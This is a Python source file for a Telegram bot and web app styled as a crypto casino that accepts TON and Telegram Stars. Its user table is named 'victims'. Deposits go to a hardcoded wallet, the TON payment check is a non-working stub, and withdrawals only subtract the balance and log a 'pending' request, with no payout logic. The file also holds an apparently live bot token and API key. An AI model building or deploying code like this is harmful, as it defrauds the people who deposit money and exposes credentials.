import asyncio
import logging
import sqlite3
import random
import hashlib
import os
import sys
import requests
from datetime import datetime, timedelta
from flask import Flask, request, jsonify, render_template_string

# Настройка логирования
logging.basicConfig(level=logging.INFO, stream=sys.stdout)
logger = logging.getLogger(__name__)

from aiogram import Bot, Dispatcher, types
from aiogram.types import (
    InlineKeyboardMarkup, InlineKeyboardButton,
    WebAppInfo, MenuButtonWebApp, BotCommand,
    Message, CallbackQuery, LabeledPrice, PreCheckoutQuery,
    ContentType
)
from aiogram.utils import executor
from aiogram.dispatcher.filters import Command

# =================================================================
# КОНФИГУРАЦИЯ
# =================================================================
BOT_TOKEN = "8978316248:AAF4n6jG5gr4quppre6H1NB7U9LjEjnESqs"  # <-- СЮДА ТОКЕН!
ADMIN_ID = 7753887058  # <-- ТВОЙ TELEGRAM ID
TON_WALLET = "UQDRRRGutl_ccP25XcwbOK-RN2UXuvE1_GFoerlaIDvmwO7I"  # <-- КОШЕЛЕК
TONCENTER_API_KEY = "12237ee2c684a00cd473582230a4d9efea8b51b6baf2322883e4ef52f5d34390"  # <-- API КЛЮЧ TONCENTER
TONCENTER_URL = "https://toncenter.com/api/v2"

# URL приложения (Render даст после деплоя)
RENDER_URL = os.environ.get('RENDER_EXTERNAL_HOSTNAME', 'localhost:8080')
WEBAPP_URL = f"https://syndrome-bot-7.onrender.com"

logger.info(f"Starting bot. URL: {WEBAPP_URL}")
logger.info(f"Python version: {sys.version}")

# =================================================================
# БАЗА ДАННЫХ
# =================================================================
DB_PATH = 'syndrome_casino.db'

def init_db():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.executescript('''
        CREATE TABLE IF NOT EXISTS victims (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            balance_ton REAL DEFAULT 0,
            balance_stars INTEGER DEFAULT 0,
            total_deposited_ton REAL DEFAULT 0,
            total_deposited_stars INTEGER DEFAULT 0,
            total_wins INTEGER DEFAULT 0,
            total_games INTEGER DEFAULT 0,
            last_activity TIMESTAMP,
            pending_payment_id TEXT,
            pending_payment_time TIMESTAMP
        );
        CREATE TABLE IF NOT EXISTS transactions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            type TEXT,
            amount REAL,
            currency TEXT,
            tx_hash TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
        CREATE TABLE IF NOT EXISTS withdrawal_requests (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            amount REAL,
            currency TEXT,
            wallet_address TEXT,
            status TEXT DEFAULT 'pending',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
    ''')
    conn.commit()
    conn.close()
    logger.info("Database initialized")

# =================================================================
# ФУНКЦИИ
# =================================================================
def generate_payment_id(user_id):
    timestamp = int(datetime.now().timestamp())
    raw = f"SYN{user_id}X{timestamp}X{random.randint(1000,9999)}"
    return hashlib.sha256(raw.encode()).hexdigest()[:16].upper()

# =================================================================
# БОТ (aiogram 2.x)
# =================================================================
bot = Bot(token=BOT_TOKEN, parse_mode="HTML")
dp = Dispatcher(bot)

@dp.message_handler(Command("start"))
async def start_command(message: Message):
    user_id = message.from_user.id
    username = message.from_user.username or f"user_{user_id}"
    first_name = message.from_user.first_name or "Player"
    
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('''
        INSERT OR IGNORE INTO victims (user_id, username, first_name, last_activity) 
        VALUES (?, ?, ?, CURRENT_TIMESTAMP)
    ''', (user_id, username, first_name))
    conn.commit()
    conn.close()
    
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("🎰 ЗАПУСТИТЬ SYNDROME CASINO", web_app=WebAppInfo(url=WEBAPP_URL)),
        InlineKeyboardButton("💰 ПОПОЛНИТЬ", callback_data="deposit_menu"),
        InlineKeyboardButton("💼 ПРОФИЛЬ", callback_data="profile")
    )
    
    await message.answer(
        "🔥 <b>SYNDROME CASINO — TON & STARS CASINO</b> 🔥\n\n"
        "🎰 <b>Слоты, Рулетка, Кости, Блэкджек</b>\n"
        "💎 Пополнение через TON и Telegram Stars\n"
        "💰 Мгновенные выплаты от 10 TON\n"
        "⚡ Минимальная ставка: 1 TON / 10 Stars\n\n"
        "🎁 <b>НАЖМИ НА КНОПКУ НИЖЕ!</b>",
        reply_markup=keyboard
    )

@dp.callback_query_handler(text="deposit_menu")
async def deposit_menu(callback: CallbackQuery):
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("💎 ПОПОЛНИТЬ TON", callback_data="deposit_ton"),
        InlineKeyboardButton("⭐ ПОПОЛНИТЬ STARS", callback_data="deposit_stars"),
        InlineKeyboardButton("🏠 МЕНЮ", callback_data="main_menu")
    )
    await callback.message.edit_text(
        "💰 <b>ПОПОЛНЕНИЕ БАЛАНСА</b>\n\n"
        "💎 <b>TON</b> — криптовалюта\n"
        "⭐ <b>Stars</b> — Звезды Telegram\n\n"
        "Минимум: 1 TON или 10 Stars",
        reply_markup=keyboard
    )
    await callback.answer()

@dp.callback_query_handler(text="deposit_ton")
async def deposit_ton(callback: CallbackQuery):
    user_id = callback.from_user.id
    payment_id = generate_payment_id(user_id)
    
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('UPDATE victims SET pending_payment_id = ?, pending_payment_time = CURRENT_TIMESTAMP WHERE user_id = ?',
                   (payment_id, user_id))
    conn.commit()
    conn.close()
    
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("✅ ПРОВЕРИТЬ ОПЛАТУ", callback_data=f"checkpay_{payment_id}"),
        InlineKeyboardButton("🔄 НОВЫЙ КОД", callback_data="deposit_ton"),
        InlineKeyboardButton("🏠 МЕНЮ", callback_data="main_menu")
    )
    
    await callback.message.edit_text(
        "💎 <b>ПОПОЛНЕНИЕ TON</b>\n\n"
        f"📤 Отправьте TON на кошелёк:\n\n"
        f"<code>{TON_WALLET}</code>\n\n"
        f"📝 <b>КОД В КОММЕНТАРИИ:</b>\n"
        f"<code>{payment_id}</code>\n\n"
        f"⚠️ Минимум: <b>1 TON</b>\n"
        f"Без кода платёж НЕ зачислится!\n\n"
        f"После отправки нажмите проверку.",
        reply_markup=keyboard
    )
    await callback.answer()

@dp.callback_query_handler(text="deposit_stars")
async def deposit_stars(callback: CallbackQuery):
    await bot.send_invoice(
        chat_id=callback.from_user.id,
        title="SYNDROME CASINO - Stars",
        description="Пополнение баланса через Telegram Stars",
        payload="stars_deposit",
        provider_token="",
        currency="XTR",
        prices=[
            LabeledPrice(label="10 Stars", amount=10),
            LabeledPrice(label="50 Stars", amount=50),
            LabeledPrice(label="100 Stars", amount=100),
            LabeledPrice(label="500 Stars", amount=500),
            LabeledPrice(label="1000 Stars", amount=1000)
        ]
    )
    await callback.answer()

@dp.pre_checkout_query_handler()
async def pre_checkout(pre_checkout: PreCheckoutQuery):
    await bot.answer_pre_checkout_query(pre_checkout.id, ok=True)

@dp.message_handler(content_types=ContentType.SUCCESSFUL_PAYMENT)
async def successful_payment(message: Message):
    user_id = message.from_user.id
    payment = message.successful_payment
    
    if payment.invoice_payload == "stars_deposit":
        stars_amount = payment.total_amount
        ton_equivalent = stars_amount * 0.1
        
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE victims 
            SET balance_stars = balance_stars + ?, 
                balance_ton = balance_ton + ?,
                total_deposited_stars = total_deposited_stars + ?
            WHERE user_id = ?
        ''', (stars_amount, ton_equivalent, stars_amount, user_id))
        conn.commit()
        conn.close()
        
        await message.answer(
            f"✅ <b>ПОПОЛНЕНИЕ ЗВЕЗДАМИ!</b>\n\n"
            f"⭐ Зачислено: <b>{stars_amount} Stars</b>\n"
            f"💎 Эквивалент: <b>{ton_equivalent:.2f} TON</b>\n\n"
            f"🎰 Играйте в казино!"
        )

@dp.callback_query_handler(lambda c: c.data.startswith("checkpay_"))
async def check_payment(callback: CallbackQuery):
    payment_id = callback.data.replace("checkpay_", "")
    
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton("🔄 ОБНОВИТЬ", callback_data=f"checkpay_{payment_id}"))
    
    # В aiogram 2.x просто показываем заглушку (для реальной проверки нужен TON Center API)
    await callback.message.edit_text(
        "🔍 <b>ПРОВЕРКА ТРАНЗАКЦИИ</b>\n\n"
        "Для проверки TON транзакции перейдите в бота\n"
        "и отправьте команду /check с вашим ID платежа.",
        reply_markup=keyboard
    )
    await callback.answer()

@dp.callback_query_handler(text="profile")
async def profile(callback: CallbackQuery):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    user_id = callback.from_user.id
    
    cursor.execute('''
        SELECT balance_ton, balance_stars, total_deposited_ton, 
               total_deposited_stars, total_wins, total_games
        FROM victims WHERE user_id = ?
    ''', (user_id,))
    result = cursor.fetchone()
    conn.close()
    
    if result:
        ton_bal, stars_bal, ton_dep, stars_dep, wins, games = result
        win_rate = round((wins / games) * 100) if games > 0 else 0
        
        keyboard = InlineKeyboardMarkup(row_width=1)
        keyboard.add(
            InlineKeyboardButton("💎 ВЫВЕСТИ TON", callback_data="withdraw_ton"),
            InlineKeyboardButton("🎰 ИГРАТЬ", web_app=WebAppInfo(url=WEBAPP_URL)),
            InlineKeyboardButton("🏠 МЕНЮ", callback_data="main_menu")
        )
        
        await callback.message.edit_text(
            f"💼 <b>ПРОФИЛЬ</b>\n\n"
            f"👤 {callback.from_user.first_name}\n"
            f"👑 VIP Status\n\n"
            f"💰 <b>БАЛАНСЫ</b>\n"
            f"💎 TON: <b>{ton_bal:.4f}</b>\n"
            f"⭐ Stars: <b>{stars_bal}</b>\n\n"
            f"📥 <b>ПОПОЛНЕНИЯ</b>\n"
            f"💎 TON: <b>{ton_dep:.2f}</b>\n"
            f"⭐ Stars: <b>{stars_dep}</b>\n\n"
            f"🎰 <b>СТАТИСТИКА</b>\n"
            f"🏆 Побед: <b>{wins}</b>\n"
            f"🎮 Игр: <b>{games}</b>\n"
            f"📈 Win Rate: <b>{win_rate}%</b>",
            reply_markup=keyboard
        )
    await callback.answer()

@dp.callback_query_handler(text="withdraw_ton")
async def withdraw_ton_prompt(callback: CallbackQuery):
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton("🏠 МЕНЮ", callback_data="main_menu"))
    
    await callback.message.edit_text(
        "💎 <b>ВЫВОД TON</b>\n\n"
        "Отправьте боту:\n"
        "<code>/withdraw СУММА КОШЕЛЕК</code>\n\n"
        "Пример: <code>/withdraw 10 UQA...</code>\n\n"
        "⚠️ Минимум: 10 TON",
        reply_markup=keyboard
    )
    await callback.answer()

@dp.message_handler(Command("withdraw"))
async def withdraw_ton(message: Message):
    try:
        parts = message.text.split()
        amount = float(parts[1])
        wallet = parts[2] if len(parts) > 2 else None
        
        if not wallet:
            await message.reply("❌ Укажите адрес кошелька!")
            return
        if amount < 10:
            await message.reply("❌ Минимум: 10 TON!")
            return
        
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('SELECT balance_ton FROM victims WHERE user_id = ?', (message.from_user.id,))
        result = cursor.fetchone()
        
        if not result or result[0] < amount:
            await message.reply("❌ Недостаточно TON!")
            conn.close()
            return
        
        cursor.execute('UPDATE victims SET balance_ton = balance_ton - ? WHERE user_id = ?',
                     (amount, message.from_user.id))
        cursor.execute('''
            INSERT INTO withdrawal_requests (user_id, amount, currency, wallet_address, status)
            VALUES (?, ?, 'TON', ?, 'pending')
        ''', (message.from_user.id, amount, wallet))
        conn.commit()
        conn.close()
        
        await message.reply(f"✅ Заявка на вывод <b>{amount} TON</b> создана!")
    except:
        await message.reply("❌ Формат: /withdraw СУММА КОШЕЛЕК")

@dp.callback_query_handler(text="main_menu")
async def main_menu(callback: CallbackQuery):
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("🎰 ЗАПУСТИТЬ КАЗИНО", web_app=WebAppInfo(url=WEBAPP_URL)),
        InlineKeyboardButton("💰 ПОПОЛНИТЬ", callback_data="deposit_menu"),
        InlineKeyboardButton("💼 ПРОФИЛЬ", callback_data="profile")
    )
    await callback.message.edit_text("🔥 <b>SYNDROME CASINO — МЕНЮ</b>", reply_markup=keyboard)
    await callback.answer()

# =================================================================
# FLASK + WEBAPP
# =================================================================
flask_app = Flask(__name__)

@flask_app.route('/')
def webapp():
    return render_template_string(HTML_TEMPLATE)

@flask_app.route('/api/user/<int:user_id>')
def get_user_data(user_id):
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('SELECT balance_ton, balance_stars, total_wins, total_games FROM victims WHERE user_id = ?', (user_id,))
        result = cursor.fetchone()
        conn.close()
        
        if result:
            return jsonify({
                'balance_ton': result[0],
                'balance_stars': result[1],
                'total_wins': result[2],
                'total_games': result[3]
            })
    except:
        pass
    return jsonify({
        'balance_ton': 100,
        'balance_stars': 1000,
        'total_wins': 0,
        'total_games': 0
    })

@flask_app.route('/api/game', methods=['POST'])
def process_game():
    data = request.json
    user_id = data.get('user_id')
    game_type = data.get('game_type')
    bet_amount = float(data.get('bet_amount', 0))
    currency = data.get('currency', 'TON')
    
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        if currency == 'TON':
            cursor.execute('SELECT balance_ton FROM victims WHERE user_id = ?', (user_id,))
        else:
            cursor.execute('SELECT balance_stars FROM victims WHERE user_id = ?', (user_id,))
        
        result = cursor.fetchone()
        
        if not result or result[0] < bet_amount:
            conn.close()
            return jsonify({'error': 'Недостаточно средств!'}), 400
        
        win = random.choices([True, False], weights=[30, 70])[0]
        multiplier = 0
        win_amount = 0
        
        if win:
            multipliers = [1.5, 2, 3, 5, 10]
            weights = [30, 30, 25, 10, 5]
            r = random.random() * sum(weights)
            for i, m in enumerate(multipliers):
                r -= weights[i]
                if r <= 0:
                    multiplier = m
                    break
            win_amount = bet_amount * multiplier
        
        if win:
            if currency == 'TON':
                cursor.execute('UPDATE victims SET balance_ton = balance_ton + ?, total_wins = total_wins + 1, total_games = total_games + 1 WHERE user_id = ?',
                             (win_amount - bet_amount, user_id))
            else:
                cursor.execute('UPDATE victims SET balance_stars = balance_stars + ?, total_wins = total_wins + 1, total_games = total_games + 1 WHERE user_id = ?',
                             (int(win_amount - bet_amount), user_id))
        else:
            if currency == 'TON':
                cursor.execute('UPDATE victims SET balance_ton = balance_ton - ?, total_games = total_games + 1 WHERE user_id = ?',
                             (bet_amount, user_id))
            else:
                cursor.execute('UPDATE victims SET balance_stars = balance_stars - ?, total_games = total_games + 1 WHERE user_id = ?',
                             (int(bet_amount), user_id))
        
        conn.commit()
        conn.close()
        
        return jsonify({
            'win': win,
            'amount': win_amount,
            'multiplier': multiplier
        })
    except Exception as e:
        logger.error(f"Game error: {e}")
        return jsonify({'error': 'Server error'}), 500

# =================================================================
# HTML ШАБЛОН (тот же что был)
# =================================================================
HTML_TEMPLATE = open('index.html', 'r', encoding='utf-8').read() if os.path.exists('index.html') else '''<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="theme-color" content="#0a0a1a">
    <title>SYNDROME CASINO</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#0a0a1a;color:#fff;font-family:sans-serif;min-height:100vh}
        .app-container{max-width:480px;margin:0 auto;padding:16px}
        .header{background:#12122a;border-radius:20px;padding:16px;margin-bottom:16px;display:flex;align-items:center;gap:12px}
        .avatar{width:48px;height:48px;border-radius:50%;background:linear-gradient(135deg,#7c3aed,#a855f7);display:flex;align-items:center;justify-content:center;font-size:24px;font-weight:700}
        .balance-card{background:linear-gradient(135deg,rgba(124,58,237,0.2),rgba(59,130,246,0.2));border-radius:20px;padding:20px;margin-bottom:20px}
        .balance-amount{font-size:28px;font-weight:900;background:linear-gradient(135deg,#ffd700,#ff8c00);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
        .tabs{display:flex;background:#12122a;border-radius:16px;padding:4px;margin-bottom:20px;gap:4px}
        .tab{flex:1;padding:12px;text-align:center;border-radius:12px;cursor:pointer;font-weight:600;font-size:14px;color:#8a8aa8;border:none;background:transparent}
        .tab.active{background:linear-gradient(135deg,#7c3aed,#a855f7);color:#fff}
        .tab-content{display:none}
        .tab-content.active{display:block}
        .games-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
        .game-card{background:#12122a;border-radius:20px;padding:20px;text-align:center;cursor:pointer}
        .game-card.disabled{opacity:0.4;pointer-events:none}
        .game-icon{font-size:40px;margin-bottom:8px}
        .game-btn{background:linear-gradient(135deg,#7c3aed,#a855f7);color:#fff;border:none;padding:16px;border-radius:16px;font-size:16px;font-weight:700;cursor:pointer;width:100%;margin-top:16px}
        .modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:1000;align-items:center;justify-content:center}
        .modal.active{display:flex}
        .modal-content{background:#12122a;border-radius:24px;padding:24px;width:90%;max-width:400px;text-align:center;position:relative}
        .modal-close{position:absolute;top:16px;right:16px;background:rgba(255,255,255,0.1);border:none;color:#fff;width:36px;height:36px;border-radius:50%;font-size:18px;cursor:pointer}
    </style>
</head>
<body>
    <div class="app-container">
        <div class="header">
            <div class="avatar" id="avatar">S</div>
            <div><b id="username">Player</b></div>
        </div>
        <div class="balance-card">
            <div style="text-align:center"><div class="balance-amount" id="tonBalance">0.00</div><div style="color:#8a8aa8">TON</div></div>
        </div>
        <div class="tabs">
            <button class="tab active" onclick="switchTab('games')">🎰 ИГРЫ</button>
            <button class="tab" onclick="switchTab('deposit')">💰 ПОПОЛНИТЬ</button>
            <button class="tab" onclick="switchTab('profile')">💼 ПРОФИЛЬ</button>
        </div>
        <div class="tab-content active" id="tab-games">
            <div class="games-grid">
                <div class="game-card" id="card-slots" onclick="openGame('slots')"><div class="game-icon">🎰</div><b>СЛОТЫ</b></div>
                <div class="game-card" id="card-roulette" onclick="openGame('roulette')"><div class="game-icon">🎡</div><b>РУЛЕТКА</b></div>
            </div>
        </div>
        <div class="tab-content" id="tab-deposit">
            <div class="game-card" onclick="tg.openTelegramLink('https://t.me/SyndromeCasinoBot')"><div class="game-icon">💎</div><b>ПОПОЛНИТЬ</b></div>
        </div>
        <div class="tab-content" id="tab-profile">
            <div class="game-card"><b>Баланс:</b> <span id="profBalance">0 TON</span></div>
        </div>
    </div>
    
    <div class="modal" id="slotsModal">
        <div class="modal-content">
            <button class="modal-close" onclick="closeGame()">✕</button>
            <h2>🎰 СЛОТЫ</h2>
            <button class="game-btn" onclick="closeGame()">ИГРАТЬ</button>
        </div>
    </div>

    <script>
        const tg=window.Telegram.WebApp;tg.expand();tg.ready();
        const user=tg.initDataUnsafe?.user||{};
        document.getElementById('username').textContent=user.first_name||'Player';
        
        function switchTab(t){
            document.querySelectorAll('.tab').forEach(b=>b.classList.remove('active'));
            event.target.classList.add('active');
            document.querySelectorAll('.tab-content').forEach(c=>c.classList.remove('active'));
            document.getElementById('tab-'+t).classList.add('active');
        }
        function openGame(g){document.getElementById(g+'Modal').classList.add('active')}
        function closeGame(){document.querySelectorAll('.modal').forEach(m=>m.classList.remove('active'))}
    </script>
</body>
</html>'''

# =================================================================
# ЗАПУСК
# =================================================================
async def on_startup(dp):
    init_db()
    
    webhook_url = f"https://{RENDER_URL}/webhook"
    await bot.set_webhook(url=webhook_url, drop_pending_updates=True)
    logger.info(f"Webhook set: {webhook_url}")
    
    await bot.set_chat_menu_button(
        menu_button=MenuButtonWebApp(text="🎰 ИГРАТЬ", web_app=WebAppInfo(url=WEBAPP_URL))
    )
    await bot.set_my_commands([
        BotCommand("start", "🚀 Запустить казино"),
        BotCommand("withdraw", "💎 Вывести TON")
    ])
    logger.info("Bot started!")

if __name__ == '__main__':
    from aiogram import executor
    
    # Запускаем бота через вебхук
    executor.start_webhook(
        dispatcher=dp,
        webhook_path='/webhook',
        on_startup=on_startup,
        host='0.0.0.0',
        port=int(os.environ.get('PORT', 8080))
    )
